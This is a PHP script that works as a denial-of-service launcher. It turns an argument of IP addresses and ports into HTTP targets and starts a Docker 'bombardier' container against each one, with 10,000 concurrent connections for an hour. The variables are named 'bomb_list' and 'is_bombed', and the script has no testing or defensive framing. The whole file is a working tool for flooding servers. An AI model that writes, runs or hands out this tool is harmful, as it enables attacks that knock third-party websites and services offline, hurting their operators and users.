<?php

function getSystemMemInfo()
{
    $data = explode("\n", file_get_contents("/proc/meminfo"));
    $meminfo = array();
    foreach ($data as $line) {
        list($key, $val) = explode(":", $line);
        $meminfo[$key] = trim($val);
    }
    return $meminfo;
}

function action($argv)
{
    $memavaible = (integer)getSystemMemInfo()['MemAvailable'];
    $rule = true;

    $is_bombed = [];
    $i = 0;

    $bomb_list = getBombList($argv);
    while ($rule) {

        foreach ($bomb_list as $key => $bomb_item) {
            if($memavaible > 100000 && !in_array($bomb_item, $is_bombed)){
                echo shell_exec("docker run -ti --rm -d alpine/bombardier -c 10000 -d 3600s -l ".$bomb_item);
                $is_bombed[] = $bomb_item;
            }

            $count_of_argv = count($argv);
            $count_of_bombed = count($is_bombed);

            if(($count_of_argv - $count_of_bombed) == 1){
                $rule = false;
            }
        }

        var_dump('iteration - '.$i.' - '.date('Y-m-d h:i:s'));
    }
}



function getBombList($argv)
{
    $text = $argv[1];

    $formated_text = trim(preg_replace('/\s+/', ' ', $text));
    $formated_text = str_replace(', ', ',', $formated_text);
    $formated_text = str_replace(' (', '(', $formated_text);
    $text_arryed = explode(' ', $formated_text);

    $bomb_list = [];
    foreach ($text_arryed as $item){
        $item_arrayed = explode('(', $item);
        if (!empty($item_arrayed)){
            $ip = $item_arrayed[0];

            try {
                $ends = explode(',', $item_arrayed[1]);
            } catch (\Exception $exception){
                $ends = [];
            }


            $last_end = end($ends);
            $last_end = str_replace(')', '', $last_end);

            $replace_to_end = [
                array_key_last($ends) => $last_end
            ];
            $ends = array_replace($ends, $replace_to_end);

            foreach ($ends as $end){
                $bomb_list[] = 'http://' . $ip . ':' . $end;
            }
        } else {
            $bomb_list[] = $item;
        }
    }

    return $bomb_list;
}

action($argv);